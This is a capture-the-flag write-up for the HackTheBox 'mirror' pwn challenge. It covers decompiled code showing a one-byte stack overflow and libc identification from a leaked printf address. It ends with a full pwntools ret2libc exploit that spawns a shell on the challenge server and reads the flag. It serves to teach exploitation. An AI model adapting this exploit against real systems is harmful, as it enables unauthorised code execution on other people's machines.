# mirror

```text
You found an ol' dirty mirror inside an abandoned house. This magic mirror reflects your most hidden desires! Use it to reveal the things you want the most in life! Don't say too much though..
```

## initial review

```text
❯ checksec mirror
[*] '/home/sky/Dropbox/ctf/hackthebox-uni-ctf-2020/pwn/mirror'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

```text
❯ ./mirror
✨ This old mirror seems to contain some hidden power..✨
There is a writing at the bottom of it..
"The mirror will reveal whatever you desire the most.. Just talk to it.."
Do you want to talk to the mirror? (y/n)
> y
Your answer was: y
"This is a gift from the craftsman.. [0x7ffeb133f5b0] [0x7f9a77796b10]"
Now you can talk to the mirror.
> hi
```

No canary and we get a couple addresses to help bypass PIE.  Let's take a look at what those addresses are and see if we can find where our stack overflow is.  

### main

```c
undefined8 main(void)

{
  undefined8 local_28;
  undefined8 local_20;
  undefined8 local_18;
  undefined8 local_10;
  
  setup();
  local_28 = 0;
  local_20 = 0;
  local_18 = 0;
  local_10 = 0;
  puts(
      "✨ This old mirror seems to contain some hidden power..✨\nThere is a writing at the bottom ofit.."
      );
  puts("\"The mirror will reveal whatever you desire the most.. Just talk to it..\"");
  printf("Do you want to talk to the mirror? (y/n)\n> ");
  read(0,&local_28,0x1f);
  if (((char)local_28 != 'y') && ((char)local_28 != 'Y')) {
    puts("You left the abandoned house safe!");
                    /* WARNING: Subroutine does not return */
    exit(0x45);
  }
  printf("Your answer was: ");
  printf((char *)&local_28);
  reveal();
  return 0;
}
```


### reveal

```c
void reveal(void)

{
  undefined local_28 [32];
  
  printf("\"This is a gift from the craftsman.. [%p] [%p]\"\n",local_28,printf);
  printf("Now you can talk to the mirror.\n> ");
                    /* Overruns using local_28(+0,1,40) */
  read(0,local_28,0x21);
  return;
}
```

So, we have a one byte overrun from local_28 which means we can control the lower byte of the stored stack base pointer.  The addresses it gives us are a variable on the stack and the location of printf.  


## leaking libc

```text
❯ nc docker.hackthebox.eu 30272
✨ This old mirror seems to contain some hidden power..✨
There is a writing at the bottom of it..
"The mirror will reveal whatever you desire the most.. Just talk to it.."
Do you want to talk to the mirror? (y/n)
> y
Your answer was: y
"This is a gift from the craftsman.. [0x7ffda86edb00] [0x7f572b026f70]"
Now you can talk to the mirror.
> ^C
```

I will be using the lovely [libc-database](https://github.com/niklasb/libc-database) to figure out the libc version from the printf address it prints.  ASLR means the upper bits are useless but the lower 12 are fixed and so can be used to determine the libc version.  

```text
❯ ./find printf f70
ubuntu-old-glibc (libc6_2.24-9ubuntu2.2_i386)
ubuntu-old-glibc (libc6_2.24-9ubuntu2_i386)
ubuntu-glibc (libc6_2.27-3ubuntu1.3_amd64)
debian-glibc (libc6_2.31-4_i386)
```

We have four candidates, only one of which is amd64 so it's pretty easy to pick from them.  The server is likely running libc 2.27.  

## putting it all together

We only have a single byte overrun so we can't overwrite the return pointer directly but as it turns out we don't need to because the main function returns after `reveal` finishes.  The "true" stored stack base pointer and the address of the buffer we're writing to only differ by a single byte so we can overwrite that byte and when `reveal` returns it will adjust the stack frame such that when main returns it looks to the beginning of our buffer for the return pointer.  We also know the libc version and the address of a symbol within libc so we can perform a [ret2libc](https://en.wikipedia.org/wiki/Return-to-libc_attack) attack and call `system("/bin/sh")`

```python
#!/usr/bin/env python3

from pwn import *
import re
exe = ELF("mirror")

context.binary = exe
context.terminal = ["termite","-e"]

def conn():
    if args.LOCAL:
        libc = ELF("/home/sky/libc-database/db/libc-2.32-5-x86_64.so")
        return (libc, process([exe.path]))
    else:
        libc = ELF("/home/sky/libc-database/db/libc6_2.27-3ubuntu1.3_amd64.so")
        return (libc, remote("docker.hackthebox.eu", 30272))


def send_padded(r, msg, l):
    assert len(msg) <= l
    r.send(msg + b"A" * (l - len(msg)))

def main():
    libc, r = conn()

    libc_rop = ROP(libc)
    POP_RDI = (libc_rop.find_gadget(['pop rdi', 'ret']))[0]

    send_padded(r,b"y",0x1f)

    r.recvuntil("This is a gift from the craftsman..")
    addresses = r.recvline().decode()

    capture = re.search("\[(.*)\] \[(.*)\]", addresses)
    stack_addr = int(capture.group(1),16)
    printf_addr = int(capture.group(2),16)
    stack_exec_addr = stack_addr - 8 # gotta move this back 8 bytes so that the stored return pointer is at the front of our buffer
    libc_base = printf_addr - libc.symbols["printf"]

    libc.address = libc_base
    buf = p64(libc_base + POP_RDI) + p64(next(libc.search(b"/bin/sh"))) + p64(libc.symbols['system']) + b"B" * 8 + bytes([(stack_exec_addr) & 0xff])
    r.send(buf)
    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()
```

```text
❯ python mirror.py
[*] '/home/sky/Dropbox/ctf/hackthebox-uni-ctf-2020/pwn/mirror'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] '/home/sky/libc-database/db/libc6_2.27-3ubuntu1.3_amd64.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to docker.hackthebox.eu on port 30272: Done
[*] Loading gadgets for '/home/sky/libc-database/db/libc6_2.27-3ubuntu1.3_amd64.so'
[*] Switching to interactive mode
Now you can talk to the mirror.
> $ cat flag.txt
HTB{0n3_byt3_cl0s3r_2_v1ct0ry}
$  
```